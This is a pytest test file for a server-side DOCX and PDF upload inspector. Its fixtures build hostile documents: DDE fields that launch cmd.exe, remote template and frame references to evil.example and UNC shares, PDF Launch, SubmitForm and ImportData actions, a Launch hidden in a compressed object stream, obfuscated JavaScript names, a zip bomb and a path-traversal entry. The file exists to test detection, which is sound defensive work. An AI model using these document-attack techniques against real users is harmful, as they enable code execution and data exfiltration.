"""Unit tests for server-side upload inspection (spec §6.2 step 2)."""

from __future__ import annotations

import io
import struct
import zipfile
import zlib

import pytest
from docx import Document
from pypdf import PdfWriter
from pypdf.generic import DictionaryObject, NameObject, StreamObject

from modules.cases.upload_guard import (
    DOCX_MIME,
    PDF_MIME,
    UploadRejected,
    _is_network_target,
    inspect_upload,
)

# ---------------------------------------------------------------- builders


def _docx_bytes() -> bytes:
    document = Document()
    document.add_paragraph("一种量化方法，包括步骤 S1。")
    buffer = io.BytesIO()
    document.save(buffer)
    return buffer.getvalue()


def _repack_docx(
    *,
    add: dict[str, bytes] | None = None,
    replace: dict[str, bytes] | None = None,
    drop: tuple[str, ...] = (),
) -> bytes:
    """以真实 docx 为底，增删改包内条目。"""
    source = zipfile.ZipFile(io.BytesIO(_docx_bytes()))
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as target:
        for info in source.infolist():
            if info.filename in drop:
                continue
            data = (replace or {}).get(info.filename, source.read(info.filename))
            target.writestr(info.filename, data)
        for name, data in (add or {}).items():
            target.writestr(name, data)
    return output.getvalue()


def _settings_rels(target: str, rel_type: str = "attachedTemplate") -> bytes:
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        f'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        f'relationships/{rel_type}" Target="{target}" TargetMode="External"/>'
        "</Relationships>"
    ).encode()


def _pdf_bytes(*, javascript: bool = False, user_password: str | None = None,
               owner_only: bool = False) -> bytes:
    writer = PdfWriter()
    writer.add_blank_page(width=200, height=200)
    if javascript:
        writer.add_js("app.alert('x');")
    if user_password is not None:
        writer.encrypt(user_password=user_password, owner_password="owner")
    elif owner_only:
        writer.encrypt(user_password="", owner_password="owner", permissions_flag=0)
    buffer = io.BytesIO()
    writer.write(buffer)
    return buffer.getvalue()


def _pdf_with_page_action(action: str) -> bytes:
    writer = PdfWriter()
    page = writer.add_blank_page(width=200, height=200)
    page[NameObject("/AA")] = DictionaryObject(
        {
            NameObject("/O"): DictionaryObject(
                {
                    NameObject("/S"): NameObject(f"/{action}"),
                    NameObject("/F"): NameObject("/calc.exe"),
                }
            )
        }
    )
    buffer = io.BytesIO()
    writer.write(buffer)
    return buffer.getvalue()


def _pdf_with_object_stream(hidden_object: bytes) -> bytes:
    """手工构造 PDF 1.5：obj 4 只存在于压缩的对象流（ObjStm）中，原始字节不可见。"""
    parts: list[bytes] = [b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"]
    offsets: dict[int, int] = {}

    def emit(num: int, body: bytes) -> None:
        offsets[num] = sum(len(p) for p in parts)
        parts.append(b"%d 0 obj\n" % num + body + b"\nendobj\n")

    emit(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    emit(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    emit(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>")
    header = b"4 0 "
    packed = zlib.compress(header + hidden_object)
    emit(
        5,
        b"<< /Type /ObjStm /N 1 /First %d /Filter /FlateDecode /Length %d >>\nstream\n"
        % (len(header), len(packed))
        + packed
        + b"\nendstream",
    )
    xref_offset = sum(len(p) for p in parts)
    rows = [struct.pack(">BIH", 0, 0, 65535)]
    for num in (1, 2, 3):
        rows.append(struct.pack(">BIH", 1, offsets[num], 0))
    rows.append(struct.pack(">BIH", 2, 5, 0))  # obj 4：位于对象流 5 的第 0 个
    rows.append(struct.pack(">BIH", 1, offsets[5], 0))
    rows.append(struct.pack(">BIH", 1, xref_offset, 0))
    xref_data = zlib.compress(b"".join(rows))
    parts.append(
        b"6 0 obj\n<< /Type /XRef /Size 7 /W [1 4 2] /Root 1 0 R /Filter /FlateDecode"
        b" /Length %d >>\nstream\n" % len(xref_data)
        + xref_data
        + b"\nendstream\nendobj\nstartxref\n%d\n%%%%EOF\n" % xref_offset
    )
    return b"".join(parts)


# ---------------------------------------------------------------- size / type


def test_accepts_clean_docx_and_reports_detected_mime() -> None:
    verdict = inspect_upload("交底书.DOCX", _docx_bytes())
    assert (verdict.kind, verdict.mime_type, verdict.findings) == ("docx", DOCX_MIME, ())


def test_accepts_clean_pdf() -> None:
    verdict = inspect_upload("disclosure.pdf", _pdf_bytes())
    assert (verdict.kind, verdict.mime_type, verdict.findings) == ("pdf", PDF_MIME, ())


@pytest.mark.parametrize(
    ("filename", "data", "code"),
    [
        ("a.docx", b"", "empty_file"),
        ("a.docx", b"x" * 11, "file_size_exceeds_30mb_limit"),
        ("a.txt", b"hello", "unsupported_file_format_only_docx_and_pdf"),
        ("a.docm", b"PK\x03\x04", "unsupported_file_format_only_docx_and_pdf"),
        ("noext", b"hello", "unsupported_file_format_only_docx_and_pdf"),
    ],
)
def test_rejects_size_and_extension(filename: str, data: bytes, code: str) -> None:
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload(filename, data, max_size=10)
    assert rejected.value.code == code


@pytest.mark.parametrize(
    ("filename", "data_factory"),
    [
        ("renamed.pdf", _docx_bytes),  # docx 改名为 pdf
        ("renamed.docx", _pdf_bytes),  # pdf 改名为 docx
        ("text.docx", lambda: "粘贴的纯文本".encode()),
        ("other-zip.docx", lambda: _repack_docx(drop=("word/document.xml",))),
        ("broken.docx", lambda: b"PK\x03\x04" + b"\x00" * 64),
    ],
)
def test_rejects_content_that_does_not_match_extension(filename: str, data_factory) -> None:
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload(filename, data_factory())
    assert rejected.value.code == "file_content_does_not_match_extension"


# ---------------------------------------------------------------- DOCX: rejected


def test_rejects_docx_with_vba_project() -> None:
    data = _repack_docx(add={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0"})
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload("a.docx", data)
    assert rejected.value.code == "macros_not_allowed"


def test_rejects_macro_enabled_package_renamed_to_docx() -> None:
    source = zipfile.ZipFile(io.BytesIO(_docx_bytes()))
    types = source.read("[Content_Types].xml").replace(
        b"document.main+xml", b"document.macroEnabled.main+xml"
    )
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload("a.docx", _repack_docx(replace={"[Content_Types].xml": types}))
    assert rejected.value.code == "macros_not_allowed"


@pytest.mark.parametrize("suffix", [".exe", ".xlsm", ".vbs"])
def test_rejects_executable_or_macro_embeddings(suffix: str) -> None:
    data = _repack_docx(add={f"word/embeddings/payload{suffix}": b"MZ"})
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload("a.docx", data)
    assert rejected.value.code == "embedded_active_content_not_allowed"


@pytest.mark.parametrize(
    "field",
    [
        b'<w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\cmd.exe "/k calc" </w:instrText>',
        b'<w:fldSimple w:instr="DDE cmd /c calc"/>',
    ],
)
def test_rejects_dde_fields(field: bytes) -> None:
    source = zipfile.ZipFile(io.BytesIO(_docx_bytes()))
    document_xml = source.read("word/document.xml").replace(b"</w:body>", field + b"</w:body>")
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload("a.docx", _repack_docx(replace={"word/document.xml": document_xml}))
    assert rejected.value.code == "dde_field_not_allowed"


@pytest.mark.parametrize(
    ("target", "rel_type"),
    [
        ("https://evil.example/t.dotm", "attachedTemplate"),
        ("\\\\evil\\share\\t.dotm", "attachedTemplate"),
        ("file://evil/share/t.dotm", "attachedTemplate"),
        ("http://evil.example/frame.html", "frame"),
        ("http://evil.example/o.bin", "oleObject"),
    ],
)
def test_rejects_network_located_external_references(target: str, rel_type: str) -> None:
    data = _repack_docx(add={"word/_rels/settings.xml.rels": _settings_rels(target, rel_type)})
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload("a.docx", data)
    assert rejected.value.code == "external_resource_reference_not_allowed"


@pytest.mark.parametrize(
    "target",
    ["file:///C:\\Users\\author\\AppData\\Local\\Temp\\t.dot", "Normal.dotm"],
)
def test_accepts_local_template_leftovers(target: str) -> None:
    """Word 文档常见的本地模板路径残留不可被远程拉取，不应误杀。"""
    data = _repack_docx(add={"word/_rels/settings.xml.rels": _settings_rels(target)})
    assert inspect_upload("a.docx", data).findings == ()


def test_accepts_external_hyperlinks() -> None:
    data = _repack_docx(
        add={"word/_rels/settings.xml.rels": _settings_rels("https://cnipa.gov.cn", "hyperlink")}
    )
    assert inspect_upload("a.docx", data).findings == ()


def test_rejects_zip_bomb_entries() -> None:
    data = _repack_docx(add={"word/media/bomb.bin": b"\x00" * (4 * 1024 * 1024)})
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload("a.docx", data)
    assert rejected.value.code == "suspicious_archive_structure"


def test_rejects_path_traversal_entries() -> None:
    data = _repack_docx(add={"../../etc/cron.d/x": b"x"})
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload("a.docx", data)
    assert rejected.value.code == "suspicious_archive_structure"


# ---------------------------------------------------------------- DOCX: recorded


def test_records_ole_embeddings_and_activex() -> None:
    """MathType/Visio 以 OLE 嵌入，交底书中常见：接收并记录。"""
    data = _repack_docx(
        add={
            "word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0",
            "word/activeX/activeX1.xml": b"<ax/>",
        }
    )
    assert inspect_upload("a.docx", data).findings == ("docx_activex_control", "docx_ole_embedding")


# ---------------------------------------------------------------- PDF


def test_records_pdf_javascript() -> None:
    assert inspect_upload("a.pdf", _pdf_bytes(javascript=True)).findings == ("pdf_javascript",)


def test_records_hex_obfuscated_javascript_name() -> None:
    data = _pdf_bytes().replace(b"/Type /Catalog", b"/Type /Catalog /J#61vaScript 1", 1)
    assert "pdf_javascript" in inspect_upload("a.pdf", data).findings


@pytest.mark.parametrize("action", ["Launch", "SubmitForm", "ImportData"])
def test_rejects_launch_and_data_exfiltration_actions(action: str) -> None:
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload("a.pdf", _pdf_with_page_action(action))
    assert rejected.value.code == "pdf_active_content_not_allowed"


def test_rejects_launch_hidden_in_compressed_object_stream() -> None:
    data = _pdf_with_object_stream(b"<< /S /Launch /F (calc.exe) >>")
    assert b"Launch" not in data  # 原始字节扫描看不到，必须靠解析扫描
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload("a.pdf", data)
    assert rejected.value.code == "pdf_active_content_not_allowed"


def test_records_javascript_hidden_in_compressed_object_stream() -> None:
    data = _pdf_with_object_stream(b"<< /S /JavaScript /JS (app.alert(1)) >>")
    assert inspect_upload("a.pdf", data).findings == ("pdf_javascript",)


def test_accepts_owner_password_only_pdf() -> None:
    """仅限制权限（空打开密码）的 PDF 很常见（数据手册、学位论文），应接收。"""
    assert inspect_upload("a.pdf", _pdf_bytes(owner_only=True)).findings == ()


def test_rejects_pdf_that_needs_a_real_password() -> None:
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload("a.pdf", _pdf_bytes(user_password="secret"))
    assert rejected.value.code == "password_protected_pdf_not_supported"


def test_rejects_unreadable_pdf() -> None:
    with pytest.raises(UploadRejected) as rejected:
        inspect_upload("a.pdf", b"%PDF-1.7\n" + b"\x00garbage" * 50)
    assert rejected.value.code == "unreadable_pdf"


def test_stream_bodies_do_not_cause_false_positives() -> None:
    """压缩流体里偶然出现 "/JS" 字节序列不是主动内容。"""
    writer = PdfWriter()
    page = writer.add_blank_page(width=200, height=200)
    stream = StreamObject()
    stream.set_data(b"BT /F1 12 Tf (x) Tj ET % /JS /Launch \n")
    page[NameObject("/Contents")] = writer._add_object(stream)  # noqa: SLF001
    buffer = io.BytesIO()
    writer.write(buffer)
    assert inspect_upload("a.pdf", buffer.getvalue()).findings == ()


# ---------------------------------------------------------------- network targets


@pytest.mark.parametrize(
    ("target", "expected"),
    [
        ("http://evil/x.dotm", True),
        ("HTTPS://A/t", True),
        ("file://evil/share/t.dotm", True),
        ("\\\\evil\\share\\t.dotm", True),
        ("//evil/t", True),
        ("file:////evil/share", True),
        ("file:///\\\\evil\\share", True),
        ("mhtml:http://x", True),
        ("file:///C:\\Users\\t.dot", False),
        ("C:\\t.dot", False),
        ("c:/t.dot", False),
        ("file:///Users/x/t.dotx", False),
        ("file:/C:/t.dot", False),
        ("Normal.dotm", False),
        ("../t.dot", False),
    ],
)
def test_network_target_classification(target: str, expected: bool) -> None:
    assert _is_network_target(target) is expected

